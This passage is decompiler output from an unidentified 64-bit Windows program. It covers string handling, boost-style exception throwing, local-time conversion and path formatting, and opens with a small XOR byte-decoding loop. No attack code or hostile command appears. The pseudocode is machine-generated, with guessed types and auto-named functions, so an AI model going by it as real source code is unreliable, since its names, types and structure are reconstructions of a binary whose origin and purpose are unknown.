      v7 = v2 - v4++;
      byte_1400DA4B0[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 7 );
  }
  return result;
}
// 1400DA484: using guessed type int dword_1400DA484;
// 1400DA488: using guessed type int dword_1400DA488;
// 1400DA48C: using guessed type int dword_1400DA48C;
// 1400DA49C: using guessed type int dword_1400DA49C;
// 1400DA4A0: using guessed type char byte_1400DA4A0;
// 1400DA4A4: using guessed type int dword_1400DA4A4;
// 1400DA4A9: using guessed type char byte_1400DA4A9;
// 1400DA4AA: using guessed type char byte_1400DA4AA;
// 1400DA4AB: using guessed type char byte_1400DA4AB;
// 1400DA4AC: using guessed type char byte_1400DA4AC;
// 1400DA4AD: using guessed type char byte_1400DA4AD;
// 1400DA4AE: using guessed type char byte_1400DA4AE;

//----- (000000014002BFC0) ----------------------------------------------------
_QWORD *__fastcall sub_14002BFC0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  char *v4; // rax
  size_t v5; // r8
  void *Dst; // [rsp+30h] [rbp-58h]
  __int64 v8; // [rsp+40h] [rbp-48h]
  unsigned __int64 v9; // [rsp+48h] [rbp-40h]
  void *v10; // [rsp+50h] [rbp-38h]
  __int64 v11; // [rsp+60h] [rbp-28h]
  unsigned __int64 v12; // [rsp+68h] [rbp-20h]

  v2 = a2;
  v3 = a1;
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  sub_140004F20(&v10, byte_1400A3400, 0i64);
  v4 = sub_14002BD10();
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Dst) = 0;
  if ( *v4 )
  {
    v5 = -1i64;
    do
      ++v5;
    while ( v4[v5] );
  }
  else
  {
    v5 = 0i64;
  }
  sub_140004F20(&Dst, v4, v5);
  sub_1400284C0(*(_QWORD *)(v3 + 24), v2, (__int64)&Dst, (__int64)&v10);
  if ( v9 >= 0x10 )
    operator delete(Dst);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Dst) = 0;
  if ( v12 >= 0x10 )
    operator delete(v10);
  return v2;
}

//----- (000000014002C0D0) ----------------------------------------------------
char __fastcall sub_14002C0D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  char *v4; // rax
  size_t v5; // r8
  void *Dst; // [rsp+28h] [rbp-50h]
  __int64 v8; // [rsp+38h] [rbp-40h]
  unsigned __int64 v9; // [rsp+40h] [rbp-38h]
  void *v10; // [rsp+48h] [rbp-30h]
  __int64 v11; // [rsp+58h] [rbp-20h]
  unsigned __int64 v12; // [rsp+60h] [rbp-18h]

  v2 = a2;
  v3 = a1;
  v4 = sub_14002BE70();
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Dst) = 0;
  if ( *v4 )
  {
    v5 = -1i64;
    do
      ++v5;
    while ( v4[v5] );
  }
  else
  {
    v5 = 0i64;
  }
  sub_140004F20(&Dst, v4, v5);
  sub_1400284C0(*(_QWORD *)(v3 + 24), &v10, (__int64)&Dst, v2);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v9 >= 0x10 )
    operator delete(Dst);
  return 1;
}

//----- (000000014002C210) ----------------------------------------------------
_QWORD *__fastcall sub_14002C210(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  sub_14002C340(a1, a2, 1);
  return v2;
}

//----- (000000014002C280) ----------------------------------------------------
_QWORD *__fastcall sub_14002C280(_QWORD *a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // rsi
  _QWORD *v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rcx

  v4 = a2;
  v5 = a1;
  v6 = 0i64;
  if ( a4 )
  {
    a1[8] = &unk_1400A7338;
    a1[10] = &off_1400A3CB8;
  }
  sub_14002C490(a1);
  *v5 = &off_1400A7308;
  v5[3] = off_1400A7318;
  *(_QWORD *)((char *)v5 + *(signed int *)(v5[8] + 4i64) + 64) = &off_1400A7320;
  v7 = *(signed int *)(v5[8] + 4i64);
  *(_DWORD *)((char *)v5 + v7 + 60) = v7 - 16;
  if ( v4 )
    v6 = v4 + 24;
  sub_140013340((__int64)(v5 + 3), v6);
  return v5;
}
// 14002C490: using guessed type __int64 __cdecl sub_14002C490(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A7308: using guessed type __int64 (__fastcall *off_1400A7308)(void *);
// 1400A7318: using guessed type __int64 (__fastcall *off_1400A7318[2])();
// 1400A7320: using guessed type __int64 (__fastcall *off_1400A7320)();

//----- (000000014002C340) ----------------------------------------------------
_QWORD *__fastcall sub_14002C340(_QWORD *a1, __int64 a2, int a3)
{
  __int64 v3; // rsi
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rcx

  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  if ( a3 )
  {
    a1[8] = &unk_1400A7338;
    a1[10] = &off_1400A3CB8;
  }
  sub_14002C490(a1);
  *v4 = &off_1400A7308;
  v4[3] = off_1400A7318;
  *(_QWORD *)((char *)v4 + *(signed int *)(v4[8] + 4i64) + 64) = &off_1400A7320;
  v6 = *(signed int *)(v4[8] + 4i64);
  *(_DWORD *)((char *)v4 + v6 + 60) = v6 - 16;
  if ( v3 )
    v5 = v3 + 24;
  sub_140013340((__int64)(v4 + 3), v5);
  return v4;
}
// 14002C490: using guessed type __int64 __cdecl sub_14002C490(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A7308: using guessed type __int64 (__fastcall *off_1400A7308)(void *);
// 1400A7318: using guessed type __int64 (__fastcall *off_1400A7318[2])();
// 1400A7320: using guessed type __int64 (__fastcall *off_1400A7320)();

//----- (000000014002C400) ----------------------------------------------------
_QWORD *__fastcall sub_14002C400(_QWORD *a1, __int64 a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[8] = &unk_1400A7338;
    a1[10] = &off_1400A3CB8;
  }
  sub_14002C490(a1);
  *v3 = &off_1400A7308;
  v3[3] = off_1400A7318;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 64) = &off_1400A7320;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 60) = 0;
  return v3;
}
// 14002C490: using guessed type __int64 __cdecl sub_14002C490(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A7308: using guessed type __int64 (__fastcall *off_1400A7308)(void *);
// 1400A7318: using guessed type __int64 (__fastcall *off_1400A7318[2])();
// 1400A7320: using guessed type __int64 (__fastcall *off_1400A7320)();

//----- (000000014002C520) ----------------------------------------------------
_QWORD *__fastcall sub_14002C520(_QWORD *a1, __int64 a2, _QWORD *a3, _QWORD *a4, __int64 a5)
{
  _QWORD *v5; // rbx
  __int64 v6; // rdi
  _QWORD *v7; // rsi
  _QWORD *v8; // rcx
  signed __int64 v9; // rcx

  v5 = a4;
  v6 = a2;
  v7 = a1;
  *a1 = off_1400A72F0;
  v8 = a1 + 1;
  v8[3] = 15i64;
  v8[2] = 0i64;
  *(_BYTE *)v8 = 0;
  sub_140004DF0(v8, a3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v9 = (signed __int64)(v7 + 5);
  *(_QWORD *)(v9 + 24) = 15i64;
  *(_QWORD *)(v9 + 16) = 0i64;
  *(_BYTE *)v9 = 0;
  sub_140004DF0(v7 + 5, v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v7[9] = v6;
  v7[10] = 9223372036854775806i64;
  sub_14002C7C0(v7 + 10);
  v7[11] = a5;
  sub_14002C7C0(v7 + 10);
  return v7;
}
// 1400A72F0: using guessed type __int64 (__fastcall *off_1400A72F0[2])();

//----- (000000014002C5F0) ----------------------------------------------------
__int64 __fastcall sub_14002C5F0(std::exception *a1)
{
  std::exception *v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A7308;
  *((_QWORD *)a1 + 3) = off_1400A7318;
  *(_QWORD *)((char *)a1 + *(signed int *)(*((_QWORD *)a1 + 8) + 4i64) + 64) = &off_1400A7320;
  v2 = *(signed int *)(*((_QWORD *)a1 + 8) + 4i64);
  *(_DWORD *)((char *)a1 + v2 + 60) = v2 - 16;
  *(_QWORD *)a1 = &off_1400A4F40;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v3 = *((_QWORD *)a1 + 4);
  if ( v3 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v3 + 32i64))() )
    *((_QWORD *)v1 + 4) = 0i64;
  return std::exception::~exception(v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);
// 1400A7308: using guessed type __int64 (__fastcall *off_1400A7308)(void *);
// 1400A7318: using guessed type __int64 (__fastcall *off_1400A7318[2])();
// 1400A7320: using guessed type __int64 (__fastcall *off_1400A7320)();

//----- (000000014002C680) ----------------------------------------------------
void __fastcall sub_14002C680(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  *(_QWORD *)a1 = off_1400A7300;
  if ( *(_QWORD *)(a1 + 96) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 72));
  *(_QWORD *)(v1 + 96) = 15i64;
  *(_QWORD *)(v1 + 88) = 0i64;
  *(_BYTE *)(v1 + 72) = 0;
  if ( *(_QWORD *)(v1 + 64) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 40));
  *(_QWORD *)(v1 + 64) = 15i64;
  *(_QWORD *)(v1 + 56) = 0i64;
  *(_BYTE *)(v1 + 40) = 0;
  if ( *(_QWORD *)(v1 + 32) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 8));
  *(_QWORD *)(v1 + 32) = 15i64;
  *(_QWORD *)(v1 + 24) = 0i64;
  *(_BYTE *)(v1 + 8) = 0;
}
// 1400A7300: using guessed type __int64 (__fastcall *off_1400A7300[2])(void *);

//----- (000000014002C710) ----------------------------------------------------
void **__fastcall sub_14002C710(std::exception *a1)
{
  std::exception *v1; // rbx
  void **result; // rax

  v1 = a1;
  sub_14002C5F0(a1);
  result = &off_1400A3CB8;
  *((_QWORD *)v1 + 10) = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (000000014002C730) ----------------------------------------------------
_QWORD *__fastcall sub_14002C730(__int64 a1, char a2)
{
  return sub_14002C750((void *)(a1 - *(signed int *)(a1 - 4) - 80), a2);
}

//----- (000000014002C740) ----------------------------------------------------
_QWORD *__fastcall sub_14002C740(__int64 a1, char a2)
{
  return sub_14002C750((void *)(a1 - 24), a2);
}

//----- (000000014002C750) ----------------------------------------------------
_QWORD *__fastcall sub_14002C750(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14002C5F0((std::exception *)a1);
  v3[10] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (000000014002C790) ----------------------------------------------------
void *__fastcall sub_14002C790(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14002C680((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014002C7C0) ----------------------------------------------------
__int64 __fastcall sub_14002C7C0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  unsigned __int16 *v2; // rax
  __int64 result; // rax
  __int64 v4; // [rsp+20h] [rbp-48h]
  __time64_t Time; // [rsp+28h] [rbp-40h]
  const char *v6; // [rsp+30h] [rbp-38h]
  __int64 v7; // [rsp+38h] [rbp-30h]
  __int64 (__fastcall **v8)(void *); // [rsp+40h] [rbp-28h]

  v7 = -2i64;
  v1 = a1;
  time64(&Time);
  v2 = (unsigned __int16 *)localtime64(&Time);
  if ( !v2 )
  {
    v6 = "could not convert calendar time to local time";
    std::exception::exception((std::exception *)&v8, &v6);
    v8 = &off_1400A4E20;
    sub_14002C240(&v8);
  }
  sub_14002CB50(&v4, v2);
  result = v4;
  *v1 = v4;
  return result;
}
// 14002C240: using guessed type __int64 __fastcall sub_14002C240(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);

//----- (000000014002C900) ----------------------------------------------------
void __fastcall sub_14002C900(__int64 a1)
{
  __int64 v1; // r14
  _BYTE *v2; // rax
  size_t v3; // r8
  _QWORD *v4; // rdi
  _QWORD *v5; // rsi
  void *Dst; // [rsp+38h] [rbp-C0h]
  __int64 v7; // [rsp+48h] [rbp-B0h]
  unsigned __int64 v8; // [rsp+50h] [rbp-A8h]
  __int64 (__fastcall **v9)(void *); // [rsp+60h] [rbp-98h]
  void *v10; // [rsp+68h] [rbp-90h]
  unsigned __int64 v11; // [rsp+80h] [rbp-78h]
  void *v12; // [rsp+88h] [rbp-70h]
  __int64 v13; // [rsp+98h] [rbp-60h]
  unsigned __int64 v14; // [rsp+A0h] [rbp-58h]
  void *v15; // [rsp+A8h] [rbp-50h]
  __int64 v16; // [rsp+B8h] [rbp-40h]
  unsigned __int64 v17; // [rsp+C0h] [rbp-38h]

  v1 = a1;
  v2 = (_BYTE *)(*(__int64 (**)(void))(**(_QWORD **)(a1 + 72) + 16i64))();
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Dst) = 0;
  if ( *v2 )
  {
    v3 = -1i64;
    do
      ++v3;
    while ( v2[v3] );
  }
  else
  {
    v3 = 0i64;
  }
  sub_140004F20(&Dst, v2, v3);
  v4 = (_QWORD *)(v1 + 40);
  v5 = (_QWORD *)(v1 + 8);
  sub_14002F460(&v9, &Dst, (_QWORD *)(v1 + 8), (_QWORD *)(v1 + 40), *(_QWORD *)(v1 + 88));
  if ( v8 >= 0x10 )
    operator delete(Dst);
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Dst) = 0;
  if ( (unsigned __int8)sub_14002C840(v1 + 80, *(unsigned int *)(v1 + 88)) )
  {
    sub_14002F560((__int64)&v9);
  }
  else
  {
    if ( *(_QWORD *)(v1 + 64) >= 0x10ui64 )
      v4 = (_QWORD *)*v4;
    if ( *(_QWORD *)(v1 + 32) >= 0x10ui64 )
      v5 = (_QWORD *)*v5;
    (*(void (__fastcall **)(_QWORD, _QWORD *, _QWORD *))(**(_QWORD **)(v1 + 72) + 8i64))(*(_QWORD *)(v1 + 72), v5, v4);
    sub_14002F550((__int64)&v9);
  }
  v9 = off_1400A7300;
  if ( v17 >= 0x10 )
    operator delete(v15);
  LOBYTE(v15) = 0;
  v16 = 0i64;
  v17 = 15i64;
  if ( v14 >= 0x10 )
    operator delete(v12);
  LOBYTE(v12) = 0;
  v13 = 0i64;
  v14 = 15i64;
  if ( v11 >= 0x10 )
    operator delete(v10);
}
// 14002C840: using guessed type __int64 __fastcall sub_14002C840(_QWORD, _QWORD);
// 1400994DF: using guessed type __int64 sub_1400994DF(void);
// 1400A7300: using guessed type __int64 (__fastcall *off_1400A7300[2])(void *);

//----- (000000014002CAC8) ----------------------------------------------------
signed __int64 __fastcall sub_14002CAC8(__int64 a1)
{
  return sub_14002CAE0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014002CAE0) ----------------------------------------------------
signed __int64 __fastcall sub_14002CAE0(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rdx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x58ui64);
  if ( v2 )
    v3 = sub_14002C280(v2, v1 - 80, 0i64, 1);
  else
    v3 = 0i64;
  if ( v3 )
    result = (signed __int64)v3 + *(signed int *)(v3[8] + 4i64) + 64;
  else
    result = 0i64;
  return result;
}

//----- (000000014002CB50) ----------------------------------------------------
signed __int64 *__fastcall sub_14002CB50(signed __int64 *a1, unsigned __int16 *a2)
{
  unsigned __int16 *v2; // rbx
  signed __int64 *v3; // rdi
  __int64 v4; // r9
  std::exception *v5; // rax
  std::exception *v6; // rax
  __int64 v7; // r8
  std::exception *v8; // rax
  std::exception *v9; // rax
  __int64 v10; // rdx
  std::exception *v11; // rax
  std::exception *v12; // rax
  __int64 v13; // r9
  __int64 v14; // r10
  __int64 v15; // rax
  signed __int64 v16; // rax
  char v18; // [rsp+28h] [rbp-A0h]
  char v19; // [rsp+40h] [rbp-88h]
  char v20; // [rsp+58h] [rbp-70h]
  char v21; // [rsp+70h] [rbp-58h]
  __int64 v22; // [rsp+88h] [rbp-40h]
  char v23; // [rsp+A0h] [rbp-28h]
  int v24; // [rsp+D8h] [rbp+10h]
  __int64 v25; // [rsp+E0h] [rbp+18h]

  v2 = a2;
  v3 = a1;
  v4 = a2[6];
  if ( (signed int)v4 + 1 < 2 )
  {
    v5 = sub_140018340((std::exception *)&v22);
    sub_140017280(v5);
  }
  if ( (unsigned __int16)v4 > 0x1Fu )
  {
    v6 = sub_140018340((std::exception *)&v20);
    sub_140017280(v6);
  }
  v7 = a2[8];
  LOWORD(v7) = v7 + 1;
  if ( (unsigned __int16)v7 + 1 < 2 )
  {
    v8 = sub_1400183F0((std::exception *)&v18);
    sub_1400172C0(v8);
  }
  if ( (unsigned __int16)v7 > 0xCu )
  {
    v9 = sub_1400183F0((std::exception *)&v19);
    sub_1400172C0(v9);
  }
  v10 = a2[10];
  LOWORD(v10) = v10 + 1900;
  if ( (unsigned __int16)v10 + 1 < 1401 )
  {
    v11 = sub_1400184A0((std::exception *)&v21);
    sub_140017300(v11);
  }
  if ( (unsigned __int16)v10 > 0x2710u )
  {
    v12 = sub_1400184A0((std::exception *)&v23);
    sub_140017300(v12);
  }
  sub_140018550(&v24, v10, v7, v4, -2i64);
  v13 = *(signed int *)v2;
  v14 = *((signed int *)v2 + 1);
  v15 = *((signed int *)v2 + 2);
  if ( (signed int)v15 < 0 || (signed int)v14 < 0 || (signed int)v13 < 0 )
    v16 = -1000000
        * ((signed int)abs((_DWORD)v13) + 60 * ((signed int)abs((_DWORD)v14) + 60i64 * (signed int)abs((_DWORD)v15)));
  else
    v16 = 1000000 * (v13 + 60 * (v14 + 60 * v15));
  v25 = v16;
  sub_140017E10(v3, (unsigned int *)&v24, &v25);
  return v3;
}
// 140018550: using guessed type __int64 __fastcall sub_140018550(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014002CCFC) ----------------------------------------------------
void __fastcall __noreturn sub_14002CCFC(__int64 a1)
{
  sub_14002CD10(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014002CD10) ----------------------------------------------------
void __fastcall __noreturn sub_14002CD10(__int64 a1)
{
  signed __int64 v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 (__fastcall **v4)(void *); // [rsp+28h] [rbp-60h]
  void **v5; // [rsp+40h] [rbp-48h]
  __int64 v6; // [rsp+48h] [rbp-40h]
  __int64 v7; // [rsp+50h] [rbp-38h]
  __int64 v8; // [rsp+58h] [rbp-30h]
  int v9; // [rsp+60h] [rbp-28h]
  int v10; // [rsp+64h] [rbp-24h]
  signed int *v11; // [rsp+68h] [rbp-20h]
  void **v12; // [rsp+78h] [rbp-10h]

  v1 = a1 - 80;
  v11 = (signed int *)&unk_1400A7338;
  v12 = &off_1400A3CB8;
  std::exception::exception((std::exception *)&v4, (const struct std::exception *)(a1 - 80));
  v4 = &off_1400A4E20;
  if ( v1 )
    v1 += 24i64;
  v5 = &off_1400A3CB0;
  v3 = *(_QWORD *)(v1 + 8);
  v6 = v3;
  if ( v3 )
    (*(void (__cdecl **)(__int64, __int64))(*(_QWORD *)v3 + 24i64))(v3, v2);
  v7 = *(_QWORD *)(v1 + 16);
  v8 = *(_QWORD *)(v1 + 24);
  v9 = *(_DWORD *)(v1 + 32);
  v4 = &off_1400A7308;
  v5 = (void **)off_1400A7318;
  *(signed int **)((char *)&v11 + v11[1]) = (signed int *)&off_1400A7320;
  *(int *)((char *)&v10 + v11[1]) = 0;
  CxxThrowException(
    &v4,
    &_TI6_AV__clone_impl_U__error_info_injector_Vruntime_error_std___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);
// 1400A7308: using guessed type __int64 (__fastcall *off_1400A7308)(void *);
// 1400A7318: using guessed type __int64 (__fastcall *off_1400A7318[2])();
// 1400A7320: using guessed type __int64 (__fastcall *off_1400A7320)();
// 1400D3DB0: using guessed type int _TI6_AV__clone_impl_U__error_info_injector_Vruntime_error_std___exception_detail_boost___exception_detail_boost__;

//----- (000000014002CE00) ----------------------------------------------------
__int64 *__fastcall sub_14002CE00(__int64 *a1, __int64 *a2, __int64 *a3)
{
  __int64 v3; // r9
  __int64 *v4; // r10
  __int64 v5; // r9
  __int64 v7; // rax
  signed int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx

  v3 = *a2;
  v4 = a1;
  if ( (unsigned __int64)(*a2 + 0x7FFFFFFFFFFFFFFFi64) <= 0xFFFFFFFFFFFFFFFCui64
    && (unsigned __int64)(*a3 + 0x7FFFFFFFFFFFFFFFi64) <= 0xFFFFFFFFFFFFFFFCui64 )
  {
    v5 = v3 - *a3;
    if ( v5 < 0 )
      v5 = -abs(v5);
    *a1 = v5;
    return a1;
  }
  v7 = *a3;
  if ( (unsigned __int64)(v3 + 0x7FFFFFFFFFFFFFFFi64) > 0xFFFFFFFFFFFFFFFDui64 )
  {
LABEL_10:
    if ( v3 == 9223372036854775806i64 || v7 == 9223372036854775806i64 )
      goto LABEL_14;
    if ( v3 == 0x7FFFFFFFFFFFFFFFi64 )
    {
      if ( v7 == 0x7FFFFFFFFFFFFFFFi64 )
        goto LABEL_14;
LABEL_27:
      if ( v3 == 9223372036854775806i64 )
        goto LABEL_14;
      if ( v3 != 0x8000000000000000i64 )
      {
        if ( v3 != 0x7FFFFFFFFFFFFFFFi64 )
        {
          v8 = 5;
          goto LABEL_15;
        }
LABEL_31:
        v8 = 2;
        goto LABEL_15;
      }
LABEL_32:
      v8 = 1;
      goto LABEL_15;
    }
    if ( v3 == 0x8000000000000000i64 )
    {
      if ( v7 == 0x8000000000000000i64 )
        goto LABEL_14;
      goto LABEL_27;
    }
    if ( v7 == 0x7FFFFFFFFFFFFFFFi64 )
      goto LABEL_32;
    if ( v7 == 0x8000000000000000i64 )
      goto LABEL_31;
LABEL_26:
    v3 -= v7;
    goto LABEL_27;
  }
  if ( v3 != 9223372036854775806i64 )
  {
    if ( (v7 - 9223372036854775806i64) & 0xFFFFFFFFFFFFFFFCui64 || v7 == -9223372036854775807i64 )
      goto LABEL_26;
    goto LABEL_10;
  }
LABEL_14:
  v8 = 0;
LABEL_15:
  if ( v8 )
  {
    v9 = v8 - 1;
    if ( !v9 )
    {
      *v4 = 0x8000000000000000i64;
      return v4;
    }
    v10 = v9 - 1;
    if ( !v10 )
    {
      *v4 = 0x7FFFFFFFFFFFFFFFi64;
      return v4;
    }
    v11 = v10 - 1;
    if ( !v11 )
    {
      *v4 = -9223372036854775807i64;
      return v4;
    }
    if ( v11 == 1 )
    {
      *v4 = 9223372036854775805i64;
      return v4;
    }
  }
  *v4 = 9223372036854775806i64;
  return v4;
}

//----- (000000014002CF80) ----------------------------------------------------
signed __int64 __fastcall sub_14002CF80(int a1, int a2, int a3, __int64 a4)
{
  signed __int64 result; // rax

  if ( a1 < 0 || a2 < 0 || a3 < 0 || a4 < 0 )
    result = -abs(a4) - 1000000 * ((signed int)abs(a3) + 60 * ((signed int)abs(a2) + 60i64 * (signed int)abs(a1)));
  else
    result = a4 + 1000000 * (a3 + 60 * (a2 + 60i64 * a1));
  return result;
}

//----- (000000014002D000) ----------------------------------------------------
void __fastcall sub_14002D000(char a1)
{
  byte_1400DA4D9 = a1;
}
// 1400DA4D9: using guessed type char byte_1400DA4D9;

//----- (000000014002D010) ----------------------------------------------------
_QWORD *__fastcall sub_14002D010(_QWORD *a1, char *a2, __int64 *a3)
{
  _QWORD *v3; // rbx
  unsigned __int64 v4; // r9
  __int64 *v5; // rax

  v3 = a1;
  if ( *(_WORD *)a2 )
  {
    v4 = -1i64;
    do
      ++v4;
    while ( *(_WORD *)&a2[2 * v4] );
  }
  else
  {
    v4 = 0i64;
  }
  v5 = sub_14002E8D0(a3, 0i64, a2, v4);
  v3[3] = 7i64;
  v3[2] = 0i64;
  *(_WORD *)v3 = 0;
  sub_14002E450(v3, v5);
  return v3;
}

//----- (000000014002D080) ----------------------------------------------------
__int64 *__fastcall sub_14002D080(__int64 *a1, __int64 a2, __int64 a3, char *a4, char *a5)
{
  __int64 *v5; // rbx
  __int64 v6; // rax
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // rdx
  void *v10; // [rsp+40h] [rbp-38h]
  __int64 v11; // [rsp+50h] [rbp-28h]
  unsigned __int64 v12; // [rsp+58h] [rbp-20h]
  __int64 v13; // [rsp+88h] [rbp+10h]
  __int64 v14; // [rsp+90h] [rbp+18h]

  v14 = a3;
  v13 = a2;
  v5 = a1;
  v12 = 7i64;
  v11 = 0i64;
  LOWORD(v10) = 0;
  sub_1400161F0(&v10, a4, a5);
  if ( (unsigned __int64)v5[3] < 8 )
    v6 = (__int64)v5;
  else
    v6 = *v5;
  if ( v14 )
    v7 = (v14 - v13) >> 1;
  else
    v7 = 0i64;
  if ( v13 )
    v8 = (v13 - v6) >> 1;
  else
    v8 = 0i64;
  sub_14002EA40(v5, v8, v7, (__int64 *)&v10, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v12 >= 8 )
    operator delete(v10);
  return v5;
}

//----- (000000014002D170) ----------------------------------------------------
_QWORD *__fastcall sub_14002D170(void *Src, void *a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rcx
  void *v4; // rdi
  _WORD *v5; // rax

  v2 = Src;
  v3 = *((_QWORD *)a2 + 2);
  v4 = a2;
  if ( v3 )
  {
    if ( *((_QWORD *)a2 + 3) < 8ui64 )
      v5 = a2;
    else
      v5 = *(_WORD **)a2;
    if ( v5[v3 - 1] != 92 )
    {
      sub_14001C4B0(a2, 1ui64, 92);
      a2 = v4;
    }
  }
  v2[3] = 7i64;
  v2[2] = 0i64;
  *(_WORD *)v2 = 0;
  sub_140005050(v2, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v2;
}

//----- (000000014002D3D0) ----------------------------------------------------
__int64 __fastcall sub_14002D3D0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 result; // rax

  v1 = a1;
  result = sub_14002D1F0(a1, 923942i64);
  if ( !(_BYTE)result )
    result = sub_14002D1F0(v1, 294i64);
  return result;
}
// 14002D1F0: using guessed type __int64 __fastcall sub_14002D1F0(_QWORD, _QWORD);

//----- (000000014002D400) ----------------------------------------------------
__int64 __fastcall sub_14002D400(_WORD *a1)
{
  _WORD *v1; // rbx
  __int64 v3; // r8
  unsigned __int64 v4; // rcx
  __int64 v5; // rdx
  bool v6; // di
  unsigned int v7; // ebx
  void *v8; // [rsp+28h] [rbp-50h]
  __int64 v9; // [rsp+38h] [rbp-40h]
  unsigned __int64 v10; // [rsp+40h] [rbp-38h]
  void *Dst; // [rsp+48h] [rbp-30h]
  unsigned __int64 v12; // [rsp+60h] [rbp-18h]

  v1 = a1;
  if ( !a1 || !*a1 )
    return 0i64;
  sub_14002DAE0((__int64 *)&v8);
  v3 = sub_140075500(&Dst, sub_14002D940)[2];
  v4 = -1i64;
  do
    ++v4;
  while ( v1[v4] );
  v5 = v9;
  v6 = v4 <= v9 + v3;
  if ( v12 >= 8 )
  {
    operator delete(Dst);
    v5 = v9;
  }
  if ( v6 )
    v7 = 0;
  else
    v7 = wcstoul(&v1[v5], 0i64, 10);
  if ( v10 >= 8 )
    operator delete(v8);
  return v7;
}

//----- (000000014002D4E0) ----------------------------------------------------
_QWORD *__fastcall sub_14002D4E0(void *Src)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  unsigned int v3; // eax
  __int64 *v4; // rax
  _QWORD *v5; // rax
  void *Srca; // [rsp+30h] [rbp-21h]
  __int64 v8; // [rsp+40h] [rbp-11h]
  unsigned __int64 v9; // [rsp+48h] [rbp-9h]
  void *Dst; // [rsp+50h] [rbp-1h]
  unsigned __int64 v11; // [rsp+68h] [rbp+17h]
  wchar_t Dest[5]; // [rsp+70h] [rbp+1Fh]
  __int64 v13; // [rsp+7Ah] [rbp+29h]
  __int64 v14; // [rsp+82h] [rbp+31h]
  __int64 v15; // [rsp+8Ah] [rbp+39h]
  int v16; // [rsp+92h] [rbp+41h]
  __int16 v17; // [rsp+96h] [rbp+45h]

  v1 = Src;
  *((_QWORD *)Src + 3) = 7i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_WORD *)Src = 0;
  v2 = sub_14002DE10(&Srca);
  sub_14002E4C0(v1, v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v9 >= 8 )
    operator delete(Srca);
  Dest[0] = 0;
  *(_QWORD *)&Dest[1] = 0i64;
  v13 = 0i64;
  v14 = 0i64;
  v15 = 0i64;
  v16 = 0;
  v17 = 0;
  v3 = sub_14002E3B0(v1);
  ultow(v3, Dest, 10);
  v4 = sub_140075500(&Dst, sub_14002D940);
